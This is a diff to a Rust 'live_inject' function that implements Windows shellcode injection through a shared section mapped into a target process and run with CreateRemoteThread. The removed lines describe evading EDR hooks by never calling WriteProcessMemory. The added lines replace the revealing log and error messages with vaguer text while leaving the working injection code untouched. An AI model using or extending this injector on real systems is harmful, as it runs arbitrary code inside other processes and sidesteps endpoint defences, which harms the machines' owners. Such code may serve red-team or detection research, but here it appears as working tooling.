@@ -23,7 +23,7 @@ pub fn live_inject(
     let size = shellcode.len();
     let invalid_handle = -1isize as *mut c_void;
 
-    log.step("[1/6] CreateFileMappingW — anonymous shared section (PAGE_EXECUTE_READWRITE)");
+    log.step("[1/6] Create shared section");
     let section = unsafe {
         resolve::CreateFileMappingW(
             invalid_handle,
@@ -35,43 +35,37 @@ pub fn live_inject(
         )
     };
     if section.is_null() {
-        return Err("CreateFileMappingW failed".to_string());
+        return Err("section creation failed".to_string());
     }
     log.info(format!("      section handle: {:?}", section));
 
-    log.step("[2/6] MapViewOfFile — map section into local process (FILE_MAP_WRITE)");
+    log.step("[2/6] Map section locally");
     let local_view = unsafe { resolve::MapViewOfFile(section, FILE_MAP_WRITE, 0, 0, size) };
     if local_view.is_null() {
         unsafe { resolve::CloseHandle(section) };
-        return Err("MapViewOfFile returned NULL — local mapping failed".to_string());
+        return Err("local mapping failed".to_string());
     }
     log.info(format!(
         "      local view at {:#p} ({} bytes)",
         local_view, size
     ));
 
-    log.step(format!(
-        "[3/6] memcpy — write {} bytes to local mapping (no WriteProcessMemory)",
-        size
-    ));
+    log.step(format!("[3/6] Write {} bytes to local mapping", size));
     unsafe {
         core::ptr::copy_nonoverlapping(shellcode.as_ptr(), local_view as *mut u8, size);
     }
-    log.info("      shellcode written to shared section via local mapping");
+    log.info("      payload written to shared section via local mapping");
 
     unsafe { resolve::UnmapViewOfFile(local_view as *const c_void) };
     log.detail("      local view unmapped");
 
-    log.step(format!(
-        "[4/6] OpenProcess(PID {}) + MapViewOfFileNuma2 — map section into target (PAGE_EXECUTE_READ)",
-        pid
-    ));
+    log.step(format!("[4/6] Open target (PID {}) + map section remotely", pid));
     let process_access =
         PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ;
     let process = unsafe { resolve::OpenProcess(process_access, 0, pid) };
     if process.is_null() {
         unsafe { resolve::CloseHandle(section) };
-        return Err("OpenProcess failed (check privileges — try from an elevated shell)".to_string());
+        return Err("process open failed (check privileges — try from an elevated shell)".to_string());
     }
 
     let remote_view = unsafe {
@@ -91,7 +85,7 @@ pub fn live_inject(
     if remote_view.is_null() {
         unsafe { resolve::CloseHandle(process) };
         return Err(
-            "MapViewOfFileNuma2 returned NULL — remote mapping failed (Windows 10 1703+ required)"
+            "remote mapping failed (Windows 10 1703+ required)"
                 .to_string(),
         );
     }
@@ -100,12 +94,9 @@ pub fn live_inject(
         "      remote view at {:#p} ({} bytes, PAGE_EXECUTE_READ)",
         remote_base, size
     ));
-    log.warning("      WriteProcessMemory was NEVER called — EDR hooks on it see nothing");
+    log.info("      no cross-process write API called");
 
-    log.step(format!(
-        "[5/6] CreateRemoteThread — start at remote address {:#p}",
-        remote_base
-    ));
+    log.step(format!("[5/6] Start remote thread at {:#p}", remote_base));
     let mut thread_id: u32 = 0;
     let thread = unsafe {
         resolve::CreateRemoteThread(
@@ -120,17 +111,17 @@ pub fn live_inject(
     };
     if thread.is_null() {
         unsafe { resolve::CloseHandle(process) };
-        return Err("CreateRemoteThread failed".to_string());
+        return Err("remote thread creation failed".to_string());
     }
     log.info(format!("      remote thread started (TID {})", thread_id));
 
-    log.step("[6/6] WaitForSingleObject — waiting for remote thread to finish");
+    log.step("[6/6] Waiting for completion");
     let wait = unsafe { resolve::WaitForSingleObject(thread, INFINITE) };
     if wait != WAIT_OBJECT_0 {
         unsafe { resolve::CloseHandle(thread) };
         unsafe { resolve::CloseHandle(process) };
         return Err(format!(
-            "WaitForSingleObject returned {} (expected WAIT_OBJECT_0)",
+            "wait returned {} (expected 0)",
             wait
         ));
     }
@@ -138,7 +129,7 @@ pub fn live_inject(
     if unsafe { resolve::GetExitCodeThread(thread, &mut exit_code) } == 0 {
         unsafe { resolve::CloseHandle(thread) };
         unsafe { resolve::CloseHandle(process) };
-        return Err("GetExitCodeThread failed".to_string());
+        return Err("exit code retrieval failed".to_string());
     }
     unsafe { resolve::CloseHandle(thread) };
     unsafe { resolve::CloseHandle(process) };
@@ -148,7 +139,7 @@ pub fn live_inject(
             "      remote thread CRASHED — exit code 0x{:X} (ACCESS_VIOLATION)",
             exit_code
         ));
-        log.error("      the shellcode hit an invalid memory access");
+        log.error("      invalid memory access");
     } else if exit_code >= 0xC0000000 {
         log.warning(format!(
             "      remote thread exited with NTSTATUS error 0x{:X}",
@@ -161,7 +152,7 @@ pub fn live_inject(
         ));
     }
     log.info(format!(
-        "      shellcode at remote address {:#p} ({} bytes)",
+        "      payload at {:#p} ({} bytes)",
         remote_base, size
     ));
     Ok(InjectionResult {
@@ -176,5 +167,5 @@ pub fn live_inject(
     _shellcode: &[u8],
     _log: &LogSink,
 ) -> Result<InjectionResult, String> {
-    Err("live injection requires Windows — this build is running on a non-Windows host".to_string())
+    Err("requires Windows".to_string())
 }
